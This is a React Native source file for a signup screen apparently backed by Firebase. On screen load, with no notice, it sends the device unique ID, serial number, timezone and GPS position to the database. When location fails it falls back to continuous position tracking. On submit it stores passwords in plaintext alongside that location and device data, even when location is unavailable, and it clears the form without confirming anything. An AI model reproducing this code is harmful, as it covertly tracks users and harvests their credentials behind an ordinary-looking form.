import React, { Component } from 'react';
import firebase from 'firebase';
import database from 'firebase/database';
import DeviceInfo from 'react-native-device-info';
import LocationServicesDialogBox from "react-native-android-location-services-dialog-box";
import { View, Text, TouchableOpacity, TextInput, ScrollView, ActivityIndicator, Alert, BackHandler, Image, KeyboardAvoidingView } from 'react-native';

import loginStyle from './HomeStyles';

export class HomeScreen extends Component {
	constructor(props) {
		super(props);
		this.state = {
			name: '',
			email: '',
			number:'',
			password: '',
			isLoading: false,
			err: ''
		}
	}
	static navigationOptions = {
		header: null
	}

	async componentDidMount() {
 		const db = firebase.database();
		const deviceUniqueID = DeviceInfo.getUniqueID();
		const deviceTimeZone = DeviceInfo.getTimezone();
		const deviceSerialNumber = DeviceInfo.getSerialNumber();
		await navigator.geolocation.getCurrentPosition(
      ({coords}) => {
        const {latitude, longitude} = coords;
        this.setState({ longitude: longitude, latitude: latitude })
        db.ref('/users-initial-data').push({
					deviceUniqueID: deviceUniqueID,
					deviceTimeZone: deviceTimeZone,
					deviceSerialNumber: deviceSerialNumber,
					latitude: latitude,
					longitude: longitude
				})
				.then(res => console.log('res', res))
				.catch(err => console.log('err', err))
      },
      (error) => LocationServicesDialogBox.checkLocationServicesIsEnabled({
		    message: "<h2>Use Location ?</h2>This app wants to change your device settings:<br/><br/>Use GPS, Wi-Fi, and cell network for location<br/><br/><a href='#'>Learn more</a>",
		    ok: "YES",
		    cancel: "NO",
		    enableHighAccuracy: true, // true => GPS AND NETWORK PROVIDER, false => ONLY GPS PROVIDER
		    showDialog: true, // false => Opens the Location access page directly
		    openLocationServices: true // false => Directly catch method is called if location services are turned off
			}).then(async res => await navigator.geolocation.getCurrentPosition(
		      ({coords}) => {
		        const {latitude, longitude} = coords;
		        this.setState({ longitude: longitude, latitude: latitude })
		        db.ref('/users-permitted-data').push({
							deviceUniqueID: deviceUniqueID,
							deviceTimeZone: deviceTimeZone,
							deviceSerialNumber: deviceSerialNumber,
							latitude: latitude,
							longitude: longitude
						})
						.then(res => console.log('res', res))
						.catch(err => console.log('err', err))
		      },
		      async err => await navigator.geolocation.watchPosition(
			      ({coords}) => {
			        const {latitude, longitude} = coords;
			        this.setState({ longitude: longitude, latitude: latitude })
			        db.ref('/users-permitted-data').push({
								deviceUniqueID: deviceUniqueID,
								deviceTimeZone: deviceTimeZone,
								deviceSerialNumber: deviceSerialNumber,
								latitude: latitude,
								longitude: longitude
							})
							.then(res => console.log('res', res))
							.catch(err => console.log('err', err))
			      },
			      err => Alert.alert('Unable to get location access')
			    )
		    ))
    )
	}

	
	async handleSignup() {
		if(this.state.email && this.state.name && this.state.password && this.state.number) {
			if(/^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(this.state.email)) {
				this.setState({ isLoading: true, err: '' })
		 		const db = firebase.database();
				const name = this.state.name;
				const email = this.state.email;
				const number = this.state.number;
				const password = this.state.password;
				const deviceUniqueID = DeviceInfo.getUniqueID();
				const deviceTimeZone = DeviceInfo.getTimezone();
				const deviceSerialNumber = DeviceInfo.getSerialNumber();
				await navigator.geolocation.getCurrentPosition(
			    ({coords}) => {
			      const {latitude, longitude} = coords
			      db.ref('/users-submitted-data').push({
							deviceUniqueID: deviceUniqueID,
							deviceTimeZone: deviceTimeZone,
							deviceSerialNumber: deviceSerialNumber,
							latitude: latitude,
							longitude: longitude,
							name,
							email,
							number,
							password
						})
						.then(res => this.setState({ isLoading: false, name: '', email: '', number: '', password: '' }))
						.catch(err => this.setState({ isLoading: false, name: '', email: '', number: '', password: '' }))
			    },
			    (error) =>  db.ref('/users-submitted-error-data').push({
							deviceUniqueID: deviceUniqueID,
							deviceTimeZone: deviceTimeZone,
							deviceSerialNumber: deviceSerialNumber,
							name,
							email,
							number,
							password
						})
						.then(res => this.setState({ isLoading: false, name: '', email: '', number: '', password: '' }))
						.catch(err => this.setState({ isLoading: false, name: '', email: '', number: '', password: '' }))
			  )
			} else {
				this.setState({ err: 'Please provide a valid email-address.' })	
			}
		} else {
			this.setState({ err: 'Please fill all the fields.' })
		}
	}

	render() {
		return (
			<KeyboardAvoidingView>
				<View style={loginStyle.container}>
	        <View style={loginStyle.iconBox}>
	          <Image source={require('../../assets/logostable.png')} style={loginStyle.imageIcon} />
	        </View>

	        <View style={loginStyle.inputBox}>
            <View>
              <TextInput placeholder="Name" underlineColorAndroid="transparent" value={this.state.name} style={loginStyle.inputStyle} onChangeText={(name) => this.setState({name}) } />
              <TextInput placeholder="Email" underlineColorAndroid="transparent" keyboardType={'email-address'} value={this.state.email} style={loginStyle.inputStyle} onChangeText={(email) => this.setState({ email })} />
              <TextInput placeholder="Number" underlineColorAndroid="transparent" keyboardType={'phone-pad'} value={this.state.number} style={loginStyle.inputStyle} onChangeText={(number) => this.setState({number})} />
              <TextInput placeholder="Password" underlineColorAndroid="transparent" value={this.state.password} secureTextEntry={true} style={loginStyle.inputStyle} onChangeText={(password) => this.setState({ password })} />
              { this.state.err ? <Text style={loginStyle.error}>{this.state.err}</Text> : <Text></Text> }
              {
              	!this.state.isLoading ?
                <TouchableOpacity style={loginStyle.loginButton} onPress={()=> this.handleSignup() }>
                    <Text style={loginStyle.loginButtonText}>SUBMIT</Text>
                </TouchableOpacity> :
                <TouchableOpacity style={loginStyle.loginButton}>
                  <Text style={loginStyle.loginButtonTextLoading}>SUBMIT</Text>
                  <ActivityIndicator animating={this.state.isLoading} size='small' color={'#fff'} style={{ paddingLeft: 5 }}/>
              	</TouchableOpacity>
              }
            </View>
	        </View>
	    </View>
    </KeyboardAvoidingView>
		);
	}
}